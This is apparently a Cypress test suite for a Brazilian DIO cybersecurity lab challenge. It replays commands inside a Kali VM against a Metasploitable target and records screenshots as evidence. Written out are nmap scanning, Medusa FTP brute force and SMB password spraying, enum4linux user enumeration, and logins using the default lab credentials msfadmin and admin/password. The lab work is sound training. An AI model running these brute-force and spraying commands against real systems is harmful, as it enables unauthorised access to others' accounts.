/// <reference types="cypress" />

// Suíte visual do desafio DIO.
// O "terminal" exibe o comando sendo digitado e, na sequência, o comando é
// executado de verdade dentro da VM Kali via VBoxManage guestcontrol (task do Node).
// O segundo teste abre o DVWA de verdade no navegador e faz login.

const COMANDOS = [
  {
    nome: '01-identidade-ip',
    comando: 'whoami && ip -4 a | grep inet',
    descricao: 'Confirmar usuario e IP do Kali (192.168.56.102)'
  },
  {
    nome: '02-ping-alvo',
    comando: 'ping -c 2 192.168.56.101',
    descricao: 'Validar conectividade com o Metasploitable'
  },
  {
    nome: '03-nmap',
    comando: 'nmap -n -sV -Pn 192.168.56.101',
    descricao: 'Enumerar portas e servicos do alvo'
  },
  {
    nome: '04-medusa-ftp',
    comando: 'medusa -h 192.168.56.101 -U /home/kali/desafio/wordlists/users.txt -P /home/kali/desafio/wordlists/passwords.txt -M ftp -t 4',
    descricao: 'Forca bruta FTP - encontrar msfadmin:msfadmin'
  },
  {
    nome: '05-enum4linux',
    comando: 'enum4linux -U 192.168.56.101',
    descricao: 'Enumerar usuarios SMB'
  },
  {
    nome: '06-medusa-smb',
    comando: 'medusa -h 192.168.56.101 -U /home/kali/desafio/wordlists/users-enum.txt -P /home/kali/desafio/wordlists/spray.txt -M smbnt -t 3',
    descricao: 'Password spraying SMB com o modulo smbnt'
  },
  {
    nome: '07-smb-acesso',
    comando: "smbclient //192.168.56.101/msfadmin -U msfadmin%msfadmin -c 'ls'",
    descricao: 'Validar acesso autenticado ao share'
  }
];

function digitarNoTerminal(comando) {
  cy.window().then((win) => {
    const campo = win.document.getElementById('comando');
    const saida = win.document.getElementById('saida');
    campo.textContent = '';
    saida.textContent += `\n$ ${comando}\n`;

    return new Cypress.Promise((resolve) => {
      let indice = 0;
      const timer = win.setInterval(() => {
        campo.textContent += comando.charAt(indice);
        indice++;
        if (indice >= comando.length) {
          win.clearInterval(timer);
          resolve();
        }
      }, 11);
    });
  });
}

function executarEExibir(item) {
  cy.log(`${item.nome}: ${item.descricao}`);
  digitarNoTerminal(item.comando);

  cy.task('kaliRun', item.comando).then((saida) => {
    cy.window().then((win) => {
      win.document.getElementById('saida').textContent += `${saida}\n`;
      win.document.getElementById('comando').textContent = '';
      win.document.getElementById('terminal').scrollTop = 1e9;
    });
    cy.task('salvarEvidencia', {
      nome: `cypress-${item.nome}.txt`,
      conteudo: `$ ${item.comando}\n\n${saida}\n`
    });
    cy.screenshot(`terminal-${item.nome}`, { capture: 'viewport' });
  });
}

describe('Desafio DIO — terminal do Kali', () => {
  it('digita e executa os comandos de verdade dentro da VM Kali', () => {
    cy.visit('http://127.0.0.1:3123/terminal.html');
    cy.get('#terminal').should('be.visible');
    cy.screenshot('terminal-00-inicio', { capture: 'viewport' });

    COMANDOS.forEach(executarEExibir);
  });
});

describe('Desafio DIO — DVWA no navegador', () => {
  it('abre o DVWA, faz login com admin/password e valida a pagina de brute force', () => {
    cy.visit('http://192.168.56.101/dvwa/login.php');
    cy.screenshot('dvwa-01-tela-login', { capture: 'viewport' });

    cy.get('input[name=username]').type('admin', { delay: 90 });
    cy.get('input[name=password]').type('password', { delay: 90, log: false });
    cy.get('input[name=Login]').click();

    cy.location('pathname', { timeout: 30000 }).should('include', 'index.php');
    cy.screenshot('dvwa-02-logado', { capture: 'viewport' });

    // Pagina de brute force ja autenticada
    cy.visit('http://192.168.56.101/dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login');
    cy.contains(/Welcome to the password protected area/i).should('be.visible');
    cy.screenshot('dvwa-03-brute-force', { capture: 'viewport' });

    cy.task('copiarScreenshots').then((resultado) => {
      cy.log(`Capturas copiadas para images/: ${resultado.copiados}`);
    });
  });
});
